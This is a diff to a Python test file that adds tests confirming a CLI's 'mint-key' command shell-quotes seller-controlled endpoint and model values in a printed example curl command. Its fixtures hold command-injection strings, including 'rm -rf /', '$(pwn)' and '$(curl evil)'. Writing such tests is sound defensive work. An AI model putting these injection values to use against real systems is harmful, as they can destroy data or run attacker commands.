@@ -9,6 +9,7 @@ math matters. The mint message / key format follow the M13 PIN verbatim:
 """
 
 import json
+import shlex
 import time as _time
 
 import pytest
@@ -231,6 +232,77 @@ def test_mint_key_requires_relay_when_listing_endpoint_empty(monkeypatch):
     result = runner.invoke(app, ["mint-key", "--payment-id", "42"])
     assert result.exit_code != 0
     assert "--relay" in all_output(result)
+
+
+# ---------------------------------------------------------------------------
+# sec-2 C1: the example curl is a COPY-PASTE shell command — endpoint/model
+# come from the on-chain listing (seller-controlled bytes), so every one of
+# their interpolations must be shlex.quoted. Without quoting, a malicious
+# listing (quotes, ;, $(), backticks) would make pasting the example execute
+# injected commands WITH the freshly minted bearer key in the headers.
+# ---------------------------------------------------------------------------
+
+
+MALICIOUS_ENDPOINT = "http://127.0.0.1:8787'; rm -rf / #$(pwn) `id`"
+MALICIOUS_MODEL = "model'; $(curl evil) `x` ;'$key"
+
+
+def _example_curl_tokens(out: str) -> list[str]:
+    """Join the printed multi-line example (backslash continuations) and
+    parse it exactly like a POSIX shell word-splitter would."""
+    lines = out.splitlines()
+    start = next(i for i, l in enumerate(lines) if l.strip().startswith("curl "))
+    parts: list[str] = []
+    for line in lines[start:]:
+        stripped = line.strip()
+        if stripped.endswith("\\"):
+            parts.append(stripped[:-1])
+            continue
+        parts.append(stripped)
+        break
+    return shlex.split(" ".join(parts))
+
+
+def test_mint_key_curl_example_neutralizes_malicious_listing(monkeypatch):
+    _set_full_env(monkeypatch)
+    _freeze_time(monkeypatch)
+    _fake_chain(monkeypatch, _payment(), listing={
+        "operator": SELLER,
+        "endpoint": MALICIOUS_ENDPOINT,
+        "models": [MALICIOUS_MODEL, ""],
+        "prices": [],
+        "active": True,
+    })
+    result = runner.invoke(app, ["mint-key", "--payment-id", "42"])
+    assert result.exit_code == 0, all_output(result)
+    tokens = _example_curl_tokens(all_output(result))
+    # Parses into EXACTLY the 8 argv words of the intended curl — no injected
+    # command ever splits out into its own word.
+    assert tokens == [
+        "curl",
+        MALICIOUS_ENDPOINT + "/v1/chat/completions",
+        "-H", f"Authorization: Bearer {tokens[3][len('Authorization: Bearer '):]}",
+        "-H", "Content-Type: application/json",
+        "-d", tokens[7],
+    ]
+    # The URL is ONE verbatim argument (shlex round-trip == original bytes).
+    assert tokens[1] == MALICIOUS_ENDPOINT + "/v1/chat/completions"
+    # The JSON body is ONE argument carrying the hostile model verbatim —
+    # json-level intact, shell-level inert.
+    assert json.loads(tokens[7])["model"] == MALICIOUS_MODEL
+
+
+def test_mint_key_curl_example_visual_unchanged_for_benign_listing(monkeypatch):
+    """Normal endpoint/model contain only shell-safe chars — shlex.quote must
+    leave the example's rendering unchanged (same paste-ready shape)."""
+    _set_full_env(monkeypatch)
+    _freeze_time(monkeypatch)
+    _fake_chain(monkeypatch, _payment())
+    result = runner.invoke(app, ["mint-key", "--payment-id", "42"])
+    assert result.exit_code == 0, all_output(result)
+    out = all_output(result)
+    assert "curl http://127.0.0.1:8787/v1/chat/completions" in out  # URL unquoted
+    assert "-d '{\"model\":\"kimi-for-coding\"" in out  # body single-quoted as before
 
 
 # ---------------------------------------------------------------------------
